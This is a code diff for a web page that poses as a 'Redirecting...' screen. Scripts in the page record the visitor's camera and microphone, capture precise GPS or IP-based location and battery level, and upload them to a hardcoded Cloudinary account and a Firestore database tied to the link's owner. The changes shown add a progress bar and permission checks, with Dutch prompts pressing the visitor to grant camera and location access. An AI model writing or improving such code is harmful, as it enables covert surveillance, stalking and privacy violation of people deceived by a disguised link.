@@ -6,16 +6,70 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f3f7fa; /* Default background */ color: #333; /* Default text color */ transition: background-color 0.5s, color 0.5s; background-size: cover; background-position: center; }
-        .container { text-align: center; padding: 40px; background-color: white; /* Default container bg */ border-radius: 12px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); width: 80%; max-width: 500px; transition: background-color 0.5s, box-shadow 0.5s; }
-        h1 { color: #007bff; /* Default heading color */ margin-bottom: 20px; transition: color 0.5s; }
-        p { font-size: 1rem; margin-bottom: 15px; transition: color 0.5s; }
-        .loading-dots::after { content: ""; animation: dots 1s steps(4) infinite; }
-        .error-message { color: #dc3545; margin-top: 20px; font-weight: bold; transition: color 0.5s; }
-        @keyframes dots { 0% {content: "";} 25% {content: ".";} 50% {content: "..";} 75% {content: "...";} }
-        .icon-container { margin-bottom: 20px; }
-        .icon-container img { max-width: 100px; }
-        .custom-text { font-size: 1.2rem; margin-top: 20px; }
+       body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f3f7fa; /* Default background */
+            color: #333; /* Default text color */
+            transition: background-color 0.5s, color 0.5s;
+            background-size: cover; /* Cover the entire page */
+            background-position: center; /* Center the background image */
+            background-repeat: no-repeat; /* Do not repeat*/
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: white; /* Default container bg */
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 500px;
+            transition: background-color 0.5s, box-shadow 0.5s;
+        }
+        h1 {
+            color: #007bff; /* Default heading color */
+            margin-bottom: 20px;
+            transition: color 0.5s;
+        }
+        p {
+            font-size: 1rem;
+            margin-bottom: 15px;
+            transition: color 0.5s;
+        }
+        .loading-dots::after {
+            content: "";
+            animation: dots 1s steps(4) infinite;
+        }
+        .error-message {
+            color: #dc3545;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: color 0.5s;
+        }
+        @keyframes dots {
+            0% {content: "";}
+            25% {content: ".";}
+            50% {content: "..";}
+            75% {content: "...";}
+        }
+        .icon-container {
+            margin-bottom: 20px;
+            display: flex;          /* Add flex display */
+            justify-content: center; /* Center horizontally */
+            align-items: center;     /* Center vertically */
+        }
+        .icon-container img {
+            max-width: 100px;
+            max-height: 100px; /* Add max-height */
+        }
+        .custom-text {
+            font-size: 1.2rem;
+            margin-top: 20px;
+        }
 
         /* Predefined Themes (within redirect.html) */
         .theme-dark {
@@ -41,6 +95,25 @@
         .theme-green h1 {
             color: #4caf50 !important;
         }
+
+        /* Progress Bar Styles */
+        #progress-bar-container {
+          width: 100%;
+          background-color: #ddd;
+          margin-bottom: 15px; /* Add some space below the bar */
+          border-radius: 4px; /* Rounded corners */
+          overflow: hidden;   /* Ensure the progress bar stays within bounds*/
+        }
+
+        #progress-bar {
+          width: 0%;
+          height: 30px;
+          background-color: #4CAF50;
+          text-align: center;
+          line-height: 30px;
+          color: white;
+          transition: width 0.5s ease;
+        }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
@@ -53,6 +126,9 @@
         </div>
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
+        <div id="progress-bar-container">
+            <div id="progress-bar"></div>
+        </div>
         <p id="custom-redirect-text" class="custom-text" style="display: none;"></p>
         <p id="error-message" class="error-message" style="display:none;"></p>
     </div>
@@ -71,6 +147,7 @@ const firebaseConfig = {
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const errorMessage = document.getElementById("error-message");
+const progressBar = document.getElementById('progress-bar'); // Get progress bar element
 
 const cloudName = "dnvkhmgj0";        // REPLACE
 const uploadPreset = "locstorage";  // REPLACE
@@ -164,6 +241,7 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
         try {
             const position = await getCurrentPositionPromise();
             locationData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
+            updateProgress(66); // Update progress after location
         } catch (error) {
             locationError = error.message || "Onbekende locatiefout";
             ipLocationData = await getIPLocationData();  // Still get IP location if GPS fails
@@ -175,6 +253,7 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     try {
         const battery = await getBatteryPromise();
         batteryData = battery.level * 100;
+        updateProgress(100);  //Final update
     } catch (error) {
         batteryError = error.message || "Onbekende batterijfout";
     }
@@ -190,6 +269,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
     if (micCamPermission) {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            updateProgress(33); // Update progress after camera
             if (recordSeconds > 0) {
                 recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -291,42 +371,64 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     }
 }
 
-// Initial setup (simplified)
+function updateProgress(percentage) {
+    progressBar.style.width = percentage + '%';
+    progressBar.textContent = percentage + '%';
+}
+
+// Initial setup
 (async () => {
     try {
         await applyUserTheme(); // Apply theme *before* collecting data
         const currentUserId = await getCurrentUserId();
         const settingsRef = db.collection('userSettings').doc(currentUserId);
         const settingsSnap = await settingsRef.get();
-        let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
+        let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default', locationPermissionSetting = false;
 
         if (settingsSnap.exists) {
-            ({ micCamPermission, recordSeconds, notificationPermission: notificationPermissionSetting, theme: themeName = 'default' } = settingsSnap.data());
-            recordSeconds = parseInt(recordSeconds, 10) || 0; // Ensure integer
+            // Use object destructuring with default values
+            ({
+                micCamPermission = false,
+                recordSeconds = 0,
+                notificationPermission: notificationPermissionSetting = false,
+                locationPermission: locationPermissionSetting = false,
+                theme: themeName = 'default'
+            } = settingsSnap.data());
+            recordSeconds = parseInt(recordSeconds, 10) || 0;
         }
-           // Removed applying the user theme because its being applied before
+
+        // Check and request permissions *before* any data collection
+        if (!micCamPermission) {
+          displayError('Accepteer camera/microfoon toestemming.');
+          return; // Stop if permission denied
+        }
+        // No need to ask for notification, if it isn't accepted already, we can not sent notifications
+        if (!locationPermissionSetting) {
+          displayError('Accepteer locatie toestemming');
+          return;// Stop if permission denied.
+        }
+
         if (notificationPermissionSetting && Notification.permission === "default") {
            await Notification.requestPermission();
         }
 
-
         // Geolocation handling (with high accuracy and timeout)
         const handleGeoSuccess = async (position) => {
-            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError); // Always pass true
+          const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+          collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError);
         };
 
         const handleGeoError = async (error) => {
-            console.error("Geolocation error:", error); // Log the actual error
+            console.error("Geolocation error:", error);
             const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);  // Always pass false
+            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
         } else {
-              const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-              collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); //  Always pass false for location
+            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
         }
 
     } catch (error) {
@@ -335,6 +437,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         errorMessage.style.display = 'block';
     }
 })();
+
 </script>
 </body>
 </html>
